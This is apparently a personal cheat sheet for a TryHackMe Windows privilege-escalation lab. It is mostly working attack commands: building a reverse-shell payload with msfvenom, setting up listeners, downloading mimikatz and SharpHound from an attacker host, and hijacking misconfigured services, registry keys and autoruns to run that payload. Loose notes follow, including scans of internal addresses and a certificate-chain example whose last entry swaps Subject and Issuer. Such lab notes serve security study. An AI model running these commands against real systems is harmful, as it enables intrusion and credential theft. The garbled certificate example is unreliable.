# 1. TEST SETUP/ENVIRONMENT

## TRYHACKME
```
https://tryhackme.com/room/windows10privesc

VULENRABLE VM ACCESS
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.63.26 

PAYLOAD CREATION
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f exe -o reverse.exe

LISTENER SETUP (OPTION1)
msfconsole
use exploit/multi/handler 
set payload windows/x64/shell_reverse_tcp
set lhost 10.18.5.137
set lport 1234
run

LISTENER SETUP (OPTION2)
nc -nlvp 1234

COPY FROM KALI TO WINDOWS - USING SMB SERVER & COPY
python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
copy \\10.18.5.137\kali\reverse.exe C:\PrivEsc\reverse.exe
copy \\192.168.174.132\kali\mimikatz.exe C:\PrivEsc\mimikatz.exe

COPY FROM KALI TO WINDOWS - USING PYTHON WEB SERVER & POWERSHELL
(New-Object System.Net.WebClient).DownloadFile("http://192.168.174.132:8000/mimikatz.exe", "C:\temp\mimikatz.exe")
(New-Object System.Net.WebClient).DownloadFile("http://192.168.174.132:8000/SharpHound.exe", "C:\temp\SharpHound.exe")

COPY FROM KALI TO LINUX - USING PYTHON WEB SERVER & WGET
cd /var/www/html/priv_esc
python3 -m http.server
wget http://10.18.5.137:8000/shell.elf
```

## TOOLS
```
VICTIM WINDOWS 

accesschk.exe
AdminPaint.lnk
CreateShortcut.vbs
lpe.bat
plink.exe
PowerUp.ps1
PrintSpoofer.exe
Procmon64.exe
PsExec64.exe
reverse.exe
RoguePotato.exe
savecred.bat
Seatbelt.exe
SharpUp.exe
winPEASany.exe


ATTACK MACHINE KALI 
reverse.exe
```



# 2. MANUAL ENUMERATION 

## USERS
```

```

## HOSTNAME
```
hostname
```

## OS VERSION & ARCHITECTURE
```

```

## RUNNING PROCESS & SERVICES
```

```

## NETWORK INFORMATION 
```

```

## FIREWALL STATUS AND RULES
```

```

## SCHEDULED TASKS
```

```

## INSTALLED APPS & PATCH LEVELS
```

```

## READABLE/WRITABLE FILES AND DIRECTORIES
```

```

## UNMOUNTED DISKS
```

```

## DEVICE DRIVERS AND KERNEL MODULES
```

```

## BINARIES THAT AUTO ELEVATE
```

```

# 3. AUTOMATED ENUMERATION 

## WINPEAS
```

```




# 4. MISCONFIGURATIONS/VULNERABILITIES EXPLOITATION 

## CATEGORY "SERVICES" - INSECURE SERVICE PERMISSIONS
```
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34

.\winPEASany.exe servicesinfo (powershell)
winPEASany.exe servicesinfo (cmd)

accesschk.exe /accepteula -uwcqv user daclsvc
sc qc daclsvc
sc config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""
sc qc daclsvc
sc start daclsvc
```

## CATEGORY "SERVICES" - UNQUOTED SERVICE PATHS
```
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34

.\winPEASany.exe servicesinfo (powershell)
winPEASany.exe servicesinfo (cmd)

sc qc unquotedsvc
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"

sc start unquotedsvc
```

## CATEGORY "SERVICES" - WEAK REGISTRY PERMISSIONS
```
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34

.\winPEASany.exe servicesinfo (powershell)
winPEASany.exe servicesinfo (cmd)

sc qc regsvc
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
regedit
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
net start regsvc
```

## CATEGORY "SERVICES" - INSECURE SERVICES EXECUTEABLES
```
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34

.\winPEASany.exe servicesinfo (powershell)
C:\PrivEsc\winPEASany.exe servicesinfo (cmd)

sc qc filepermsvc
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
net start filepermsvc
```

## CATEGORY "REGISTRY" - AUTORUNS 
```
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

cd /var/www/html/priv_esc
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f exe -o reverse.exe
python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .

copy \\10.18.5.137\kali\reverse.exe C:\PrivEsc\reverse.exe
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y

nc -nlvp 1234
rdesktop 10.10.128.34
admin/password123
```











zenmap
Kali Linux
vmware player
Kali Linux 
nessus
burpsuite
lightsoot
greenshot
7-zip
notepad++
visul studio code
wireshark

sslscan 172.16.3.17:3389

SMB Signing not required
enum4linux -a 172.16.3.13   

postgres pentest
openvpn server 1194 pentest

SSL CERTIFICATE CANNOT BE TRUSTED
https://shagihan.medium.com/what-is-certificate-chain-and-how-to-verify-them-be429a030887

└─$ curl -I https://shhq.datalines.com.sg/index.jsp



Root CA
Subject: name of the root CA
Issuer: name of the root CA


Intermediate CA
Subject: Name of the intermediate CA
Issuer: Name of the root CA


Server Certificate
Subject: Name of the certificate CA
Issuer: Name of the intermediate CA




USERTrust RSA Certification Authority
Sectigo RSA Domain Validation Secure Server CA
*.datalines.com.sg



Root CA
Subject: USERTrust RSA Certification Authority
Issuer: USERTrust RSA Certification Authority


Intermediate CA
Subject: Sectigo RSA Domain Validation Secure Server CA
Issuer: USERTrust RSA Certification Authority


Server Certificate
Subject: Sectigo RSA Domain Validation Secure Server CA
Issuer: *.datalines.com.sg






